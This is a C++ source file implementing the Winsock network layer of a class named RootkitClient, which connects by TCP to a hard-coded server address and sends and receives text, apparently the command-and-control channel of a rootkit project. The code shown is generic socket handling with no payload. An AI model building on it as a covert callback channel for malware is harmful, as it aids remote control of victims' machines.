#include "network_handler.h"
Network::WrapWSA::WrapWSA() {
	WSAData wsaData;

	if (WSAStartup(MAKEWORD(2, 2), &wsaData)) {
		throw std::exception("Error on starting sockets");
	}

}
void Network::WrapWSA::cleanup() {
	std::cout << "WSACleanup called\n";
	WSACleanup();
}
int Network::WrapWSA::getError() {
	return WSAGetLastError();
}

bool Network::RootkitClient::connect_to_server() {

	sockaddr_in server;
	InetPtonA(AF_INET, Network::SERVER_IP , &(server.sin_addr));
	//server.sin_addr.s_addr = inet_addr(ipaddress.c_str());
	server.sin_family = AF_INET;
	server.sin_port = htons(m_port);
	return connect(m_server_socket, (const sockaddr*)&server, sizeof(server)) == 0;

}

Network::RootkitClient::RootkitClient(): m_port(Network::SERVER_PORT){
	m_wsa = Network::WrapWSA();
	m_server_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	std::cout << "checking got socket...\n";


	if (m_server_socket == INVALID_SOCKET)
		throw std::exception("Couldn't open socket");

	std::cout << "trying init\n";


	bool status = connect_to_server();


	if (!status)
		throw std::exception("couldn't listen/bind to port");

	std::cout << "done init\n";

}

Network::RootkitClient::~RootkitClient() {

	std::cout << "closing socket.\n";

	closesocket(m_server_socket);
	m_wsa.cleanup();
}


bool Network::RootkitClient::ReceiveText(std::string& text) {

	char recived_buffer[MAX_PACKET_SIZE]{ 0 };

	int bytes_recived = recv(m_server_socket, recived_buffer, MAX_PACKET_SIZE, 0);

	if (bytes_recived == SOCKET_ERROR) {
		std::cout << "SOCKET ERROR! errorcode:";
		std::cout << m_wsa.getError() << "\n";
		return false;
	}
	std::cout << recived_buffer << "\n";

	text += recived_buffer;

	return text.size();
}


bool Network::RootkitClient::SendText(std::string& text) {

	int bytes_recived = send(m_server_socket, text.c_str(), text.size(), 0);

	if (bytes_recived == SOCKET_ERROR) {
		std::cout << "SOCKET ERROR! errorcode:";
		std::cout <<m_wsa.getError() << "\n";
		return false;
	}

	return true;
}

